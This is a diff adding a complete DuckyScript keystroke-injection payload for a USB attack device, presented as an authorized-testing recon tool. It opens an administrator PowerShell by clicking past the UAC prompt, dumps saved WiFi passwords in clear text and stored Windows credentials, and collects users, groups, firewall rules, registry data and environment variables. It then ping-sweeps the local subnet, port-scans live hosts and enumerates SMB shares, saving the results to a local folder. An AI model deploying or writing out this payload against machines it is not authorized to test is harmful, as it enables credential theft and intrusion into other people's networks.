@@ -1,0 +1,377 @@
+REM Network Reconnaissance and Information Gathering
+REM This payload performs network discovery and basic reconnaissance
+REM Author: MHC Project
+REM Version: 1.0
+REM WARNING: For authorized penetration testing only!
+
+DELAY 2000
+
+REM Open PowerShell as Administrator
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+CTRL SHIFT ENTER
+DELAY 2000
+ALT y
+DELAY 2000
+
+REM Create reconnaissance directory
+STRING New-Item -ItemType Directory -Path "C:\NetworkRecon" -Force
+ENTER
+DELAY 1000
+STRING cd C:\NetworkRecon
+ENTER
+
+REM Display banner
+STRING Write-Host "========================================" -ForegroundColor Cyan
+ENTER
+STRING Write-Host "    NETWORK RECONNAISSANCE SUITE" -ForegroundColor Green
+ENTER
+STRING Write-Host "    For Authorized Testing Only!" -ForegroundColor Red
+ENTER
+STRING Write-Host "========================================" -ForegroundColor Cyan
+ENTER
+DELAY 2000
+
+REM Get basic network information
+STRING Write-Host "Gathering Local Network Information..." -ForegroundColor Yellow
+ENTER
+STRING ipconfig /all | Out-File -FilePath "LocalNetworkConfig.txt"
+ENTER
+DELAY 2000
+
+STRING route print | Out-File -FilePath "RoutingTable.txt"
+ENTER
+DELAY 2000
+
+STRING arp -a | Out-File -FilePath "ARPTable.txt"
+ENTER
+DELAY 2000
+
+REM DNS Information
+STRING Write-Host "Gathering DNS Information..." -ForegroundColor Yellow
+ENTER
+STRING nslookup | Out-File -FilePath "DNSInfo.txt"
+ENTER
+DELAY 1000
+
+REM Network interfaces and connections
+STRING Write-Host "Analyzing Network Interfaces..." -ForegroundColor Yellow
+ENTER
+STRING netsh interface show interface | Out-File -FilePath "NetworkInterfaces.txt"
+ENTER
+DELAY 2000
+
+STRING netstat -ano | Out-File -FilePath "ActiveConnections.txt"
+ENTER
+DELAY 3000
+
+REM WiFi profiles (if available)
+STRING Write-Host "Extracting WiFi Profiles..." -ForegroundColor Yellow
+ENTER
+STRING netsh wlan show profiles | Out-File -FilePath "WiFiProfiles.txt"
+ENTER
+DELAY 2000
+
+REM Get detailed WiFi info for each profile
+STRING $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
+ENTER
+STRING foreach ($profile in $wifiProfiles) {
+ENTER
+STRING   Write-Host "Extracting details for: $profile" -ForegroundColor Green
+ENTER
+STRING   netsh wlan show profile name="$profile" key=clear | Out-File -Append -FilePath "WiFiDetails.txt"
+ENTER
+STRING   echo "===========================================" | Out-File -Append -FilePath "WiFiDetails.txt"
+ENTER
+STRING }
+ENTER
+DELAY 5000
+
+REM Network discovery - ping sweep of local subnet
+STRING Write-Host "Performing Network Discovery (Ping Sweep)..." -ForegroundColor Yellow
+ENTER
+STRING $subnet = (Get-NetRoute -DestinationPrefix "0.0.0.0/0").NextHop | Select-Object -First 1
+ENTER
+STRING $baseIP = $subnet.Substring(0, $subnet.LastIndexOf('.'))
+ENTER
+STRING Write-Host "Scanning subnet: $baseIP.x" -ForegroundColor Green
+ENTER
+STRING $aliveHosts = @()
+ENTER
+STRING for ($i = 1; $i -le 254; $i++) {
+ENTER
+STRING   $ip = "$baseIP.$i"
+ENTER
+STRING   if (Test-Connection -ComputerName $ip -Count 1 -Quiet -TimeoutSeconds 1) {
+ENTER
+STRING     $aliveHosts += $ip
+ENTER
+STRING     Write-Host "Host alive: $ip" -ForegroundColor Green
+ENTER
+STRING   }
+ENTER
+STRING }
+ENTER
+STRING $aliveHosts | Out-File -FilePath "AliveHosts.txt"
+ENTER
+DELAY 30000
+
+REM Port scanning for discovered hosts (basic)
+STRING Write-Host "Performing Basic Port Scan on Discovered Hosts..." -ForegroundColor Yellow
+ENTER
+STRING $commonPorts = @(21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 8080)
+ENTER
+STRING foreach ($host in $aliveHosts) {
+ENTER
+STRING   Write-Host "Scanning ports for: $host" -ForegroundColor Green
+ENTER
+STRING   $openPorts = @()
+ENTER
+STRING   foreach ($port in $commonPorts) {
+ENTER
+STRING     $tcpClient = New-Object System.Net.Sockets.TcpClient
+ENTER
+STRING     $tcpClient.ReceiveTimeout = 1000
+ENTER
+STRING     $tcpClient.SendTimeout = 1000
+ENTER
+STRING     try {
+ENTER
+STRING       $tcpClient.Connect($host, $port)
+ENTER
+STRING       $openPorts += $port
+ENTER
+STRING       Write-Host "$host : $port - OPEN" -ForegroundColor Green
+ENTER
+STRING     } catch {
+ENTER
+STRING       # Port closed or filtered
+ENTER
+STRING     } finally {
+ENTER
+STRING       $tcpClient.Close()
+ENTER
+STRING     }
+ENTER
+STRING   }
+ENTER
+STRING   if ($openPorts) {
+ENTER
+STRING     "$host - Open Ports: $($openPorts -join ', ')" | Out-File -Append -FilePath "PortScanResults.txt"
+ENTER
+STRING   }
+ENTER
+STRING }
+ENTER
+DELAY 60000
+
+REM SMB shares enumeration
+STRING Write-Host "Enumerating SMB Shares..." -ForegroundColor Yellow
+ENTER
+STRING foreach ($host in $aliveHosts) {
+ENTER
+STRING   try {
+ENTER
+STRING     Write-Host "Checking SMB shares on: $host" -ForegroundColor Green
+ENTER
+STRING     $shares = net view \\$host 2>$null
+ENTER
+STRING     if ($shares) {
+ENTER
+STRING       "$host SMB Shares:" | Out-File -Append -FilePath "SMBShares.txt"
+ENTER
+STRING       $shares | Out-File -Append -FilePath "SMBShares.txt"
+ENTER
+STRING       "===========================================" | Out-File -Append -FilePath "SMBShares.txt"
+ENTER
+STRING     }
+ENTER
+STRING   } catch {
+ENTER
+STRING     # SMB not available or access denied
+ENTER
+STRING   }
+ENTER
+STRING }
+ENTER
+DELAY 30000
+
+REM System information gathering
+STRING Write-Host "Gathering System Information..." -ForegroundColor Yellow
+ENTER
+STRING systeminfo | Out-File -FilePath "SystemInfo.txt"
+ENTER
+DELAY 5000
+
+STRING whoami /all | Out-File -FilePath "CurrentUserInfo.txt"
+ENTER
+DELAY 2000
+
+STRING net user | Out-File -FilePath "LocalUsers.txt"
+ENTER
+STRING net localgroup | Out-File -FilePath "LocalGroups.txt"
+ENTER
+DELAY 2000
+
+REM Network services and processes
+STRING Write-Host "Analyzing Network Services..." -ForegroundColor Yellow
+ENTER
+STRING Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"} | Select-Object LocalAddress,LocalPort,OwningProcess | Out-File -FilePath "ListeningPorts.txt"
+ENTER
+DELAY 2000
+
+STRING tasklist /svc | Out-File -FilePath "ServicesAndProcesses.txt"
+ENTER
+DELAY 3000
+
+REM Firewall status
+STRING Write-Host "Checking Firewall Configuration..." -ForegroundColor Yellow
+ENTER
+STRING netsh advfirewall show allprofiles | Out-File -FilePath "FirewallStatus.txt"
+ENTER
+DELAY 2000
+
+STRING Get-NetFirewallRule | Where-Object {$_.Enabled -eq "True" -and $_.Direction -eq "Inbound"} | Select-Object DisplayName,Action,Protocol | Out-File -FilePath "FirewallRules.txt"
+ENTER
+DELAY 3000
+
+REM Registry enumeration for interesting information
+STRING Write-Host "Extracting Registry Information..." -ForegroundColor Yellow
+ENTER
+STRING reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | Out-File -FilePath "WindowsVersion.txt"
+ENTER
+DELAY 1000
+
+STRING reg query "HKLM\SYSTEM\CurrentControlSet\Services" | Out-File -FilePath "InstalledServices.txt"
+ENTER
+DELAY 3000
+
+REM Network credentials (if any stored)
+STRING Write-Host "Checking for Stored Network Credentials..." -ForegroundColor Yellow
+ENTER
+STRING cmdkey /list | Out-File -FilePath "StoredCredentials.txt"
+ENTER
+DELAY 1000
+
+REM Environment variables
+STRING Get-ChildItem Env: | Out-File -FilePath "EnvironmentVariables.txt"
+ENTER
+DELAY 1000
+
+REM Generate comprehensive report
+STRING Write-Host "Generating Reconnaissance Summary Report..." -ForegroundColor Green
+ENTER
+STRING $report = @"
+ENTER
+STRING NETWORK RECONNAISSANCE REPORT
+ENTER
+STRING ======================================
+ENTER
+STRING Date: $(Get-Date)
+ENTER
+STRING Target: $env:COMPUTERNAME
+ENTER
+STRING User Context: $env:USERNAME
+ENTER
+STRING Domain: $env:USERDOMAIN
+ENTER
+STRING 
+ENTER
+STRING DISCOVERED INFORMATION:
+ENTER
+STRING 
+ENTER
+STRING 1. NETWORK CONFIGURATION
+ENTER
+STRING    - Local network configuration saved to LocalNetworkConfig.txt
+ENTER
+STRING    - Routing table saved to RoutingTable.txt
+ENTER
+STRING    - ARP table saved to ARPTable.txt
+ENTER
+STRING    - Active connections saved to ActiveConnections.txt
+ENTER
+STRING 
+ENTER
+STRING 2. WIRELESS NETWORKS
+ENTER
+STRING    - WiFi profiles saved to WiFiProfiles.txt
+ENTER
+STRING    - Detailed WiFi information saved to WiFiDetails.txt
+ENTER
+STRING 
+ENTER
+STRING 3. NETWORK DISCOVERY
+ENTER
+STRING    - Live hosts saved to AliveHosts.txt
+ENTER
+STRING    - Port scan results saved to PortScanResults.txt
+ENTER
+STRING    - SMB shares enumeration saved to SMBShares.txt
+ENTER
+STRING 
+ENTER
+STRING 4. SYSTEM INFORMATION
+ENTER
+STRING    - System details saved to SystemInfo.txt
+ENTER
+STRING    - Current user information saved to CurrentUserInfo.txt
+ENTER
+STRING    - Local users and groups saved to respective files
+ENTER
+STRING 
+ENTER
+STRING 5. SECURITY ANALYSIS
+ENTER
+STRING    - Listening ports saved to ListeningPorts.txt
+ENTER
+STRING    - Firewall configuration saved to FirewallStatus.txt
+ENTER
+STRING    - Firewall rules saved to FirewallRules.txt
+ENTER
+STRING    - Stored credentials saved to StoredCredentials.txt
+ENTER
+STRING 
+ENTER
+STRING NEXT STEPS:
+ENTER
+STRING 1. Analyze all generated files for vulnerabilities
+ENTER
+STRING 2. Verify discovered services and open ports
+ENTER
+STRING 3. Check for weak configurations
+ENTER
+STRING 4. Document findings for remediation
+ENTER
+STRING 5. Perform deeper analysis on interesting findings
+ENTER
+STRING 
+ENTER
+STRING WARNING: This reconnaissance was performed for authorized
+ENTER
+STRING testing purposes only. Ensure proper authorization before
+ENTER
+STRING using these techniques on any network.
+ENTER
+STRING "@
+ENTER
+STRING $report | Out-File -FilePath "ReconSummary.txt"
+ENTER
+
+STRING Write-Host $report -ForegroundColor Cyan
+ENTER
+
+STRING Write-Host "Network Reconnaissance Complete!" -ForegroundColor Green
+ENTER
+STRING Write-Host "Results saved to: C:\NetworkRecon" -ForegroundColor Yellow
+ENTER
+STRING Write-Host "Review all files for security findings." -ForegroundColor Red
+ENTER
+
+REM Open the results folder
+STRING explorer C:\NetworkRecon
+ENTER
+
+DELAY 2000
